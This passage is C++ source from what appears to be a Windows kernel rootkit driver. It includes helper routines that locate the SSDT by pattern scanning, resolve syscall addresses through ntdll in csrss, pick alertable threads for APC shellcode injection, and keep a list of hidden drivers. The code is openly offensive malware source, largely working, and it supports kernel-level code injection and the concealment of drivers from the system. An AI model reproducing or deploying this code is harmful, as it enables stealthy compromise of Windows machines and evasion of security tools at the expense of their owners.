	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

	if (!dosHeader)
		return functionAddress;

	// Checking that the image is valid PE file.
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return functionAddress;

	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)moduleBase + dosHeader->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		return functionAddress;

	IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

	if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
		return functionAddress;

	// Iterating the export directory.
	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addresses = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfFunctions);
	WORD* ordinals = (WORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNameOrdinals);
	DWORD* names = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNames);

	for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
		if (_stricmp((char*)((PUCHAR)moduleBase + names[j]), functionName) == 0) {
			functionAddress = (PUCHAR)moduleBase + addresses[ordinals[j]];
			break;
		}
	}

	return functionAddress;
}

/*
* Description:
* GetSSDTFunctionAddress is responsible for getting the SSDT's location.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
*/
PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
	KAPC_STATE state;
	PEPROCESS CsrssProcess = NULL;
	PVOID functionAddress = NULL;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	ULONG infoSize = 0;
	ULONG index = 0;
	UCHAR syscall = 0;
	HANDLE csrssPid = 0;

	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo)
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!originalInfo)
			break;
		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !originalInfo)
		return functionAddress;

	// Using another info variable to avoid BSOD on freeing.
	info = originalInfo;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
			if (_wcsicmp(info->ImageName.Buffer, L"csrss.exe") == 0) {
				csrssPid = info->UniqueProcessId;
				break;
			}
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	if (csrssPid == 0)
		return functionAddress;

	status = PsLookupProcessByProcessId(csrssPid, &CsrssProcess);

	if (!NT_SUCCESS(status))
		return functionAddress;

	// Attaching to the process's stack to be able to walk the PEB.
	KeStackAttachProcess(CsrssProcess, &state);
	PVOID ntdllBase = GetModuleBase(CsrssProcess, L"C:\\Windows\\System32\\ntdll.dll");

	if (!ntdllBase) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(CsrssProcess);
		return functionAddress;
	}
	PVOID ntdllFunctionAddress = GetFunctionAddress(ntdllBase, functionName);

	if (!ntdllFunctionAddress) {
		KeUnstackDetachProcess(&state);
		ObDereferenceObject(CsrssProcess);
		return functionAddress;
	}

	// Searching for the syscall.
	while (((PUCHAR)ntdllFunctionAddress)[index] != RETURN_OPCODE) {
		if (((PUCHAR)ntdllFunctionAddress)[index] == MOV_EAX_OPCODE) {
			syscall = ((PUCHAR)ntdllFunctionAddress)[index + 1];
		}
		index++;
	}
	KeUnstackDetachProcess(&state);

	if (syscall != 0)
		functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);

	ObDereferenceObject(CsrssProcess);
	return functionAddress;
}


/*
* Description:
* GetSSDTAddress is responsible for getting the SSDT's location.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
*/
NTSTATUS MemoryUtils::GetSSDTAddress() {
	ULONG infoSize = 0;
	PVOID ssdtRelativeLocation = NULL;
	PVOID ntoskrnlBase = NULL;
	PRTL_PROCESS_MODULES info = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	UCHAR pattern[] = "\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7";

	// Getting ntoskrnl base first.
	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (info)
			ExFreePoolWithTag(info, DRIVER_TAG);
		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!info) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !info)
		return status;

	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;

	for (ULONG i = 0; i < info->NumberOfModules; i++) {
		if (NtCreateFile >= modules[i].ImageBase && NtCreateFile < (PVOID)((PUCHAR)modules[i].ImageBase + modules[i].ImageSize)) {
			ntoskrnlBase = modules[i].ImageBase;
			break;
		}
	}

	if (!ntoskrnlBase)
		return STATUS_NOT_FOUND;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntoskrnlBase;

	// Finding the SSDT address.
	status = STATUS_NOT_FOUND;

	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return STATUS_INVALID_ADDRESS;

	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntoskrnlBase + dosHeader->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		return STATUS_INVALID_ADDRESS;

	PIMAGE_SECTION_HEADER firstSection = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);

	for (PIMAGE_SECTION_HEADER section = firstSection; section < firstSection + ntHeaders->FileHeader.NumberOfSections; section++) {
		if (strcmp((const char*)section->Name, ".text") == 0) {
			ssdtRelativeLocation = FindPattern(pattern, 0xCC, sizeof(pattern) - 1, (PUCHAR)ntoskrnlBase + section->VirtualAddress, section->Misc.VirtualSize, NULL, NULL);

			if (ssdtRelativeLocation) {
				status = STATUS_SUCCESS;
				this->ssdt = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)ssdtRelativeLocation + *(PULONG)((PUCHAR)ssdtRelativeLocation + 3) + 7);
				break;
			}
		}
	}

	return status;
}

/*
* Description:
* FindPattern is responsible for finding a pattern in memory range.
*
* Parameters:
* @pattern		  [PCUCHAR]	    -- Pattern to search for.
* @wildcard		  [UCHAR]		-- Used wildcard.
* @len			  [ULONG_PTR]	-- Pattern length.
* @base			  [const PVOID] -- Base address for searching.
* @size			  [ULONG_PTR]	-- Address range to search in.
* @foundIndex	  [PULONG]	    -- Index of the found signature.
* @relativeOffset [ULONG]		-- If wanted, relative offset to get from.
*
* Returns:
* @address		  [PVOID]	    -- Pattern's address if found, else 0.
*/
PVOID MemoryUtils::FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
	bool found;

	if (pattern == NULL || base == NULL || len == 0 || size == 0)
		return NULL;

	for (ULONG i = 0; i < size; i++) {
		found = true;

		for (ULONG j = 0; j < len; j++) {
			if (pattern[j] != wildcard && pattern[j] != ((PCUCHAR)base)[i + j]) {
				found = false;
				break;
			}
		}

		if (found) {
			if (foundIndex)
				*foundIndex = i;
			return (PUCHAR)base + i + relativeOffset;
		}
	}

	return NULL;
}

/*
* Description:
* FindAlertableThread is responsible for finding an alertable thread within a process.
*
* Parameters:
* @Process    [PEPROCESS] -- The process to search on.
*
* Returns:
* @Thread	  [PETHREAD]  -- PETHREAD object if found, else null.
*/
NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
	ULONG alertableThread;
	ULONG guiThread;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	ULONG infoSize = 0;

	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo)
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!originalInfo) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !originalInfo)
		return status;

	status = STATUS_NOT_FOUND;

	// Using another info variable to avoid BSOD on freeing.
	info = originalInfo;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->UniqueProcessId == pid) {
			status = STATUS_SUCCESS;
			break;
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	if (!NT_SUCCESS(status))
		return status;

	// Finding a suitable thread.
	for (ULONG i = 0; i < info->NumberOfThreads; i++) {
		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId())
			continue;

		status = PsLookupThreadByThreadId(info->Threads[i].ClientId.UniqueThread, Thread);

		if (!NT_SUCCESS(status))
			continue;

		if (PsIsThreadTerminating(*Thread)) {
			ObDereferenceObject(*Thread);
			*Thread = NULL;
			continue;
		}

		guiThread = *(PULONG64)((PUCHAR)*Thread + GUI_THREAD_FLAG_OFFSET) & GUI_THREAD_FLAG_BIT;
		alertableThread = *(PULONG64)((PUCHAR)*Thread + ALERTABLE_THREAD_FLAG_OFFSET) & ALERTABLE_THREAD_FLAG_BIT;

		if (guiThread != 0 ||
			alertableThread == 0 ||
			*(PULONG64)((PUCHAR)*Thread + THREAD_KERNEL_STACK_OFFSET) == 0 ||
			*(PULONG64)((PUCHAR)*Thread + THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0) {
			ObDereferenceObject(*Thread);
			*Thread = NULL;
			continue;
		}
		break;
	}

	status = *Thread ? STATUS_SUCCESS : STATUS_NOT_FOUND;
	return status;
}

/*
* Description:
* FindHiddenDriver is responsible for searching if an item exists in the list of hidden drivers.
*
* Parameters:
* @item	  [HiddenDriverItem*] -- Driver to search for.
*
* Returns:
* @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
*/
ULONG MemoryUtils::FindHiddenDriver(HiddenDriverItem item) {
	AutoLock lock(this->hiddenDrivers.Lock);

	for (ULONG i = 0; i <= this->hiddenDrivers.LastIndex; i++)
		if (_wcsicmp(this->hiddenDrivers.Items[i].DriverName, item.DriverName) == 0)
			return i;
	return ITEM_NOT_FOUND;
}

/*
* Description:
* AddHiddenDriver is responsible for adding an item to the list of hidden drivers.
*
* Parameters:
* @item	  [HiddenDriverItem] -- Driver to add.
*
* Returns:
* @status [bool]			 -- Whether successfully added or not.
*/
bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
	AutoLock lock(this->hiddenDrivers.Lock);

	for (ULONG i = 0; i < MAX_HIDDEN_DRIVERS; i++)
		if (this->hiddenDrivers.Items[i].DriverName == nullptr) {
			SIZE_T bufferSize = (wcslen(item.DriverName) + 1) * sizeof(WCHAR);
			WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, bufferSize, DRIVER_TAG);

			if (!buffer)
				return false;

			memset(buffer, 0, bufferSize);
			/*errno_t err = wcscpy_s(buffer, wcslen(item.DriverName), item.DriverName);

			if (err != 0) {
				ExFreePoolWithTag(buffer, DRIVER_TAG);
				return false;
			}*/

			__try {
				RtlCopyMemory(buffer, item.DriverName, bufferSize);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				ExFreePoolWithTag(buffer, DRIVER_TAG);
				return false;
			}
			
			if (i > this->hiddenDrivers.LastIndex)
				this->hiddenDrivers.LastIndex = i;

			this->hiddenDrivers.Items[i].DriverName = buffer;
			this->hiddenDrivers.Items[i].originalEntry = item.originalEntry;
			this->hiddenDrivers.Count++;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove an item from the list of hidden drivers.
*
* Parameters:
* @item	  [HiddenDriverItem] -- Driver to remove.
*
* Returns:
* @status [bool]			 -- Whether successfully removed or not.
*/
bool MemoryUtils::RemoveHiddenDriver(HiddenDriverItem item) {
	ULONG newLastIndex = 0;
	AutoLock lock(this->hiddenDrivers.Lock);

	for (ULONG i = 0; i <= this->hiddenDrivers.LastIndex; i++) {
		if (this->hiddenDrivers.Items[i].DriverName != nullptr) {
			if (_wcsicmp(this->hiddenDrivers.Items[i].DriverName, item.DriverName) == 0) {
				ExFreePoolWithTag(this->hiddenDrivers.Items[i].DriverName, DRIVER_TAG);

				if (i == this->hiddenDrivers.LastIndex)
					this->hiddenDrivers.LastIndex = newLastIndex;
				this->hiddenDrivers.Items[i].DriverName = nullptr;
				this->hiddenDrivers.Items[i].originalEntry = NULL;
				this->hiddenDrivers.Count--;
				return true;
			}
			else
				newLastIndex = i;
		}
	}

	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove an item from the list of hidden drivers (by index).
*
* Parameters:
* @index	  [ULONG] -- Index of the driver to remove.
*
* Returns:
* @status	  [bool]  -- Whether successfully removed or not.
*/
bool MemoryUtils::RemoveHiddenDriver(ULONG index) {
	ULONG newLastIndex = 0;
	AutoLock lock(this->hiddenDrivers.Lock);

	if (index <= this->hiddenDrivers.LastIndex) {
		if (this->hiddenDrivers.Items[index].DriverName != nullptr) {
			ExFreePoolWithTag(this->hiddenDrivers.Items[index].DriverName, DRIVER_TAG);

			if (index == this->hiddenDrivers.LastIndex) {

				// Only if this is the last index, find the next last index.
				for (ULONG i = 0; i < index; i++) {
					if (this->hiddenDrivers.Items[i].DriverName != nullptr)
						newLastIndex = i;
				}
				this->hiddenDrivers.LastIndex = newLastIndex;
			}
			this->hiddenDrivers.Items[index].DriverName = NULL;
			this->hiddenDrivers.Items[index].originalEntry = NULL;
			this->hiddenDrivers.Count--;
			return true;
		}
	}

	return false;
}

/*
* Description:
* ApcInjectionCallback is responsible for handling the APC cleanup.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);
	UNREFERENCED_PARAMETER(NormalContext);

	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL;

	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

/*
* Description:
* PrepareApcCallback is responsible for force the APC execution.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	KeTestAlertThread(UserMode);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}